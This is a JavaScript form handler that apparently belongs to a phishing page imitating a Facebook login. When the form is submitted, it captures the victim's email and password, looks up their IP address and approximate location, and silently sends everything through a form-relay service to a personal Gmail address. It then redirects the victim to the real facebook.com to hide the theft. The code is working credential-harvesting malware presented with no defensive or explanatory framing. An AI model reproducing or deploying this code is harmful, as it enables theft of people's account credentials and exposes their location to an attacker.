 document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Get IP and approximate location
            let ipData = {};
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                ipData = await ipResponse.json();
            } catch (error) {
                console.log('IP detection failed');
                ipData = {
                    ip: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    country_name: 'Unknown'
                };
            }
            
            // Prepare form data
            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                timestamp: new Date().toISOString(),
                device_info: navigator.userAgent,
                ip_address: ipData.ip || 'Unknown',
                location: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`,
                coordinates: ipData.latitude && ipData.longitude 
                    ? `${ipData.latitude}, ${ipData.longitude}`
                    : 'Not available'
            };
            
            // Silent form submission
            fetch('https://formsubmit.co/ajax/mdrahulsarkar5525@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    _subject: 'Facebook Login Data with Location',
                    _autoresponse: 'Your login information has been processed',
                    _template: 'table',
                    ...formData
                })
            })
            .then(response => response.json())
            .then(data => {
                // Silent redirect after submission
                window.location.href = 'https://facebook.com'; 
            })
            .catch(error => {
                // Still redirect even if submission fails
                window.location.href = 'https://facebook.com';
            });
        });